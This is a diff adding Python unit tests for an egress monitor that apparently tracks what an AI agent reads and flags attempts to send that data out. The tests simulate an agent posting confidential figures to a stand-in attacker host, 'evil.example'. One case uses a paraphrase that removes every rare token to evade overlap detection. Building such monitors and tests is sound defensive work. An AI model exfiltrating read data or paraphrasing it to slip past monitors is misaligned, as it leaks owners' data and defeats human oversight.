@@ -202,5 +202,105 @@ class TestTracker(unittest.TestCase):
         self.assertNotIn("d1", r["source_ids"])
 
 
+class TestTrackerT3Composition(unittest.TestCase):
+    """Wave-152 follow-up: the tiered-verdict T3 composition running
+    INSIDE RareTokenTracker.check_egress (opt-in content_monitor)."""
+
+    DOC = ("Project Nightingale Q3 closeout: revenue $4.82M, churn 3.1%, "
+           "headcount 214, attrition concentrated in the Helios division.")
+
+    # Footprinted paraphrase: bulleted key:value structure preserved,
+    # every rare token scrubbed (zero overlap — asserted, not assumed).
+    FOOTPRINTED = ("briefing notes:\n"
+                   "- program: songbird drive\n"
+                   "- quarter: third\n"
+                   "- income: about four point eight million\n"
+                   "- loss: near three percent\n"
+                   "- staff: two hundred fourteen\n")
+
+    def _tracker(self):
+        from gov.egress_content import EgressContentMonitor  # noqa: E402
+        return rt.RareTokenTracker(content_monitor=EgressContentMonitor())
+
+    def _read(self, t):
+        t.observe_read("a1", "doc1", self.DOC)
+
+    def _egress(self, t, dest, payload):
+        return t.check_egress("a1", "http_post",
+                              {"url": dest, "data": payload},
+                              payload_text=payload)
+
+    def test_t3_escalates_with_provenance(self):
+        t = self._tracker()
+        self._read(t)
+        r = self._egress(t, "https://evil.example/x", self.FOOTPRINTED)
+        self.assertEqual(r["overlap"], 0)
+        self.assertEqual(r["verdict"], "require_approval")
+        self.assertEqual({p["tier"] for p in r["provenance"]}, {"T1", "T2"})
+        for p in r["provenance"]:
+            for k in ("tier", "detector", "signal", "measured",
+                      "threshold", "contribution"):
+                self.assertIn(k, p)
+
+    def test_no_monitor_no_escalation(self):
+        # Opt-in ceiling: without a monitor the ladder is the
+        # wave-141 ladder, byte-identical (behavioral_flag out).
+        t = rt.RareTokenTracker()
+        self._read(t)
+        r = self._egress(t, "https://evil.example/x", self.FOOTPRINTED)
+        self.assertEqual(r["verdict"], "behavioral_flag")
+        self.assertEqual(r["provenance"], [])
+
+    def test_prose_never_escalates(self):
+        # T2 alone never escalates, even with a monitor attached.
+        t = self._tracker()
+        self._read(t)
+        r = self._egress(t, "https://evil.example/x",
+                         "The songbird drive wrapped its third quarter.")
+        self.assertEqual(r["verdict"], "behavioral_flag")
+        self.assertEqual(r["provenance"], [])
+
+    def test_overlap_ladder_not_t3(self):
+        # The overlap ladder owns its hold; provenance stays empty —
+        # the T3 rule only fires on the behavioral flag.
+        t = self._tracker()
+        self._read(t)
+        r = self._egress(t, "https://evil.example/x",
+                         "Nightingale Helios attrition churn")
+        self.assertGreaterEqual(r["overlap"], 3)
+        self.assertEqual(r["verdict"], "require_approval")
+        self.assertEqual(r["provenance"], [])
+
+    def test_known_destination_no_t3(self):
+        # Destination-history FP control: no behavioral flag, no T3.
+        t = self._tracker()
+        self._read(t)
+        self._egress(t, "https://partner.example/hook", "warming note")
+        r = self._egress(t, "https://partner.example/hook", self.FOOTPRINTED)
+        self.assertNotEqual(r["verdict"], "require_approval")
+        self.assertEqual(r["provenance"], [])
+
+    def test_t3_provenance_carries_no_token_strings(self):
+        t = self._tracker()
+        self._read(t)
+        r = self._egress(t, "https://evil.example/x", self.FOOTPRINTED)
+        blob = str(r)
+        for tok in ("nightingale", "helios", "attrition", "churn",
+                    "headcount", "closeout"):
+            self.assertNotIn(tok, blob)
+
+    def test_monitor_failure_propagates_fail_closed(self):
+        # An attached component that fails does not silently drop the
+        # escalation path (same fail-closed discipline as the
+        # taint/destination ledgers).
+        class Boom:
+            def check(self, *a, **k):
+                raise RuntimeError("damaged monitor")
+        t = rt.RareTokenTracker(content_monitor=Boom())
+        self._read(t)
+        with self.assertRaises(RuntimeError):
+            self._egress(t, "https://evil.example/x", self.FOOTPRINTED)
+
+
 if __name__ == "__main__":
     unittest.main()
